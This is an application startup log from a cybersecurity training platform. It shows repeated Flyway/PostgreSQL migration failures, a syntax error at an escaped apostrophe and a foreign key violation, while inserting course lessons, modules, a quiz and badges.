--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 42601
Error Code : 0
Message    : ERROR: syntax error at or near "s"
  Position: 788
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 279
Statement  : -- Lessons for AI Governance
INSERT INTO lessons (section_id, name, content, content_type, order_index, estimated_minutes)
VALUES 
    (40, 'AI Ethics Principles', 'Fairness, accountability, transparency, and explainability. Building trustworthy AI systems.', 'text', 1, 20),
    (40, 'AI Risk Management', 'Identifying and mitigating risks in AI systems. NIST AI Risk Management Framework.', 'video', 2, 25),
    (41, 'Types of Bias in ML', 'Data bias, algorithmic bias, and deployment bias. Sources and manifestations of unfairness in AI.', 'text', 1, 25),
    (41, 'Fairness Metrics and Testing', 'Measuring fairness: demographic parity, equalized odds, and other metrics. Testing for bias in production systems.', 'video', 2, 30),
    (42, 'EU AI Act', 'Understanding Europe\'s comprehensive AI regulation. Risk-based approach and compliance requirements.', 'text', 1, 20),
    (42, 'AI Governance Frameworks', 'ISO/IEC standards, NIST guidelines, and industry best practices for AI governance.', 'video', 2, 25);

-- Quiz for AI Security
INSERT INTO quizzes (section_id, name, description, passing_score, time_limit_minutes, max_attempts)
VALUES (31, 'AI Security Fundamentals Quiz', 'Test your understanding of AI and ML security concepts.', 70, 15, 3);

INSERT INTO quiz_questions (quiz_id, question_text, question_type, explanation, order_index, points)
VALUES 
    (4, 'What is an adversarial example?', 'multiple_choice', 'An adversarial example is a carefully crafted input designed to fool an ML model.', 1, 1),
    (4, 'Differential privacy adds noise to data to protect individual privacy.', 'true_false', 'Differential privacy uses calibrated noise addition to provide mathematical privacy guarantees.', 2, 1);

INSERT INTO quiz_options (question_id, option_text, is_correct, order_index)
VALUES 
    (8, 'A malicious ML model', FALSE, 1),
    (8, 'An input designed to fool an ML model', TRUE, 2),
    (8, 'A type of neural network', FALSE, 3),
    (8, 'A data poisoning attack', FALSE, 4),
    (9, 'True', TRUE, 1),
    (9, 'False', FALSE, 2);

-- ============================================================================
-- ADDITIONAL BADGES FOR NEW PATHS
-- ============================================================================

INSERT INTO badges (name, description, icon, badge_type, criteria, points)
VALUES 
    ('Threat Hunter', 'Complete the Threat Intelligence & Hunting learning path', 'target', 'path', '{"type": "path_completion", "path_id": 5}', 500),
    ('Security Architect', 'Complete the Security Architecture & Zero Trust learning path', 'blueprint', 'path', '{"type": "path_completion", "path_id": 6}', 500),
    ('AI Security Expert', 'Complete the AI Security & Adversarial ML learning path', 'robot', 'path', '{"type": "path_completion", "path_id": 7}', 500),
    ('Zero Trust Champion', 'Complete all Zero Trust Architecture modules', 'shield-check', 'module', '{"type": "module_completion", "module_id": 27}', 100),
    ('Adversarial ML Specialist', 'Complete all Adversarial Machine Learning modules', 'brain-circuit', 'module', '{"type": "module_completion", "module_id": 32}', 100),
    ('Threat Intelligence Analyst', 'Complete all Threat Intelligence modules', 'magnifying-glass-chart', 'module', '{"type": "module_completion", "module_id": 21}', 100);

-- Made with Bob

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: syntax error at or near "s"
  Position: 788
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:28:30.340 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Starting CyberSkill Platform...
2026-03-12 00:28:30.343 [vert.x-eventloop-thread-1] INFO  com.cyberskill.config.AppConfig - Application properties loaded successfully
2026-03-12 00:28:30.445 [vert.x-eventloop-thread-1] INFO  com.cyberskill.MainVerticle - Running database migrations...
2026-03-12 00:28:30.555 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - Flyway OSS Edition 10.4.1 by Redgate
2026-03-12 00:28:30.556 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - 
2026-03-12 00:28:30.556 [vert.x-eventloop-thread-1] INFO  o.f.c.i.s.classpath.ClassPathScanner - See release notes here: https://rd.gt/416ObMi
2026-03-12 00:28:30.735 [vert.x-eventloop-thread-1] INFO  org.flywaydb.core.FlywayExecutor - Database: jdbc:postgresql://localhost:5432/cyberskill (PostgreSQL 16.3)
2026-03-12 00:28:30.774 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbValidate - Successfully validated 4 migrations (execution time 00:00.025s)
2026-03-12 00:28:30.854 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Current version of schema "public": 2
2026-03-12 00:28:30.889 [vert.x-eventloop-thread-1] INFO  o.f.core.internal.command.DbMigrate - Migrating schema "public" to version "3 - Additional Learning Paths"
2026-03-12 00:28:30.914 [vert.x-eventloop-thread-1] ERROR o.f.core.internal.command.DbMigrate - Migration of schema "public" to version "3 - Additional Learning Paths" failed! Changes successfully rolled back.
2026-03-12 00:28:30.921 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Database migration failed
org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:28:30.929 [vert.x-eventloop-thread-1] ERROR com.cyberskill.MainVerticle - ✗ Error during startup
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:382)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$applyMigrations$1(DbMigrate.java:272)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.core.internal.command.DbMigrate.applyMigrations(DbMigrate.java:271)
	at org.flywaydb.core.internal.command.DbMigrate.migrateGroup(DbMigrate.java:244)
	at org.flywaydb.core.internal.command.DbMigrate.lambda$migrateAll$0(DbMigrate.java:139)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:73)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.lambda$execute$0(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.core.internal.jdbc.TransactionalExecutionTemplate.execute(TransactionalExecutionTemplate.java:55)
	at org.flywaydb.database.postgresql.PostgreSQLAdvisoryLockTemplate.execute(PostgreSQLAdvisoryLockTemplate.java:56)
	at org.flywaydb.database.postgresql.PostgreSQLConnection.lock(PostgreSQLConnection.java:96)
	at org.flywaydb.core.internal.schemahistory.JdbcTableSchemaHistory.lock(JdbcTableSchemaHistory.java:144)
	at org.flywaydb.core.internal.command.DbMigrate.migrateAll(DbMigrate.java:139)
	at org.flywaydb.core.internal.command.DbMigrate.migrate(DbMigrate.java:97)
	at org.flywaydb.core.Flyway.lambda$migrate$0(Flyway.java:202)
	at org.flywaydb.core.FlywayExecutor.execute(FlywayExecutor.java:215)
	at org.flywaydb.core.Flyway.migrate(Flyway.java:147)
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:210)
	... 13 common frames omitted
Caused by: org.flywaydb.core.internal.sqlscript.FlywaySqlScriptException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
    (5, 'Threat Intelligence Platforms & Tools', 'Master TIPs, MISP, STIX/TAXII, and other intelligence tools.', 3, 8),
    (5, 'Threat Hunting Methodologies', 'Proactive threat hunting techniques and hypothesis-driven investigations.', 4, 10),
    (5, 'Intelligence-Driven Defense', 'Operationalizing threat intelligence for defensive security.', 5, 5)

	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.handleException(DefaultSqlScriptExecutor.java:270)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:225)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.execute(DefaultSqlScriptExecutor.java:128)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.executeOnce(SqlMigrationExecutor.java:68)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.lambda$execute$0(SqlMigrationExecutor.java:57)
	at org.flywaydb.core.internal.database.DefaultExecutionStrategy.execute(DefaultExecutionStrategy.java:27)
	at org.flywaydb.core.internal.resolver.sql.SqlMigrationExecutor.execute(SqlMigrationExecutor.java:56)
	at org.flywaydb.core.internal.command.DbMigrate.doMigrateGroup(DbMigrate.java:374)
	... 30 common frames omitted
Caused by: org.postgresql.util.PSQLException: ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
	at org.postgresql.core.v3.QueryExecutorImpl.receiveErrorResponse(QueryExecutorImpl.java:2712)
	at org.postgresql.core.v3.QueryExecutorImpl.processResults(QueryExecutorImpl.java:2400)
	at org.postgresql.core.v3.QueryExecutorImpl.execute(QueryExecutorImpl.java:367)
	at org.postgresql.jdbc.PgStatement.executeInternal(PgStatement.java:498)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:415)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:335)
	at org.postgresql.jdbc.PgStatement.executeCachedSql(PgStatement.java:321)
	at org.postgresql.jdbc.PgStatement.executeWithFlags(PgStatement.java:297)
	at org.postgresql.jdbc.PgStatement.execute(PgStatement.java:292)
	at org.flywaydb.core.internal.jdbc.JdbcTemplate.executeStatement(JdbcTemplate.java:210)
	at org.flywaydb.core.internal.sqlscript.ParsedSqlStatement.execute(ParsedSqlStatement.java:97)
	at org.flywaydb.core.internal.sqlscript.DefaultSqlScriptExecutor.executeStatement(DefaultSqlScriptExecutor.java:213)
	... 36 common frames omitted
2026-03-12 00:28:30.937 [vert.x-eventloop-thread-0] ERROR i.v.c.i.l.c.VertxIsolatedDeployer - Failed in deploying verticle
java.lang.RuntimeException: Database migration failed
	at com.cyberskill.MainVerticle.runDatabaseMigrations(MainVerticle.java:214)
	at com.cyberskill.MainVerticle.start(MainVerticle.java:87)
	at io.vertx.core.impl.DeploymentManager.lambda$doDeploy$5(DeploymentManager.java:210)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:276)
	at io.vertx.core.impl.ContextInternal.dispatch(ContextInternal.java:258)
	at io.vertx.core.impl.ContextInternal.lambda$runOnContext$0(ContextInternal.java:56)
	at io.netty.util.concurrent.AbstractEventExecutor.runTask(AbstractEventExecutor.java:173)
	at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:166)
	at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:470)
	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:569)
	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:997)
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
	at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)
	at java.base/java.lang.Thread.run(Thread.java:1447)
Caused by: org.flywaydb.core.internal.command.DbMigrate$FlywayMigrateException: Migration V3__Additional_Learning_Paths.sql failed
--------------------------------------------------
SQL State  : 23503
Error Code : 0
Message    : ERROR: insert or update on table "modules" violates foreign key constraint "modules_learning_path_id_fkey"
  Detail: Key (learning_path_id)=(5) is not present in table "learning_paths".
Location   : db/migration/V3__Additional_Learning_Paths.sql (C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\file:\C:\Users\I74350754\Documents\GitHub\CyberSkill\cyber-skill-platform\target\cyberskill-platform-1.0.0-fat.jar!\db\migration\V3__Additional_Learning_Paths.sql)
Line       : 20
Statement  : -- Modules for Threat Intelligence & Hunting
INSERT INTO modules (learning_path_id, name, description, order_index, estimated_hours)
VALUES 
    (5, 'Threat Intelligence Fundamentals', 'Core concepts of cyber threat intelligence and intelligence lifecycle.', 1, 8),
    (5, 'Threat Actor Analysis', 'Understanding threat actors, their motivations, tactics, and techniques.', 2, 9),
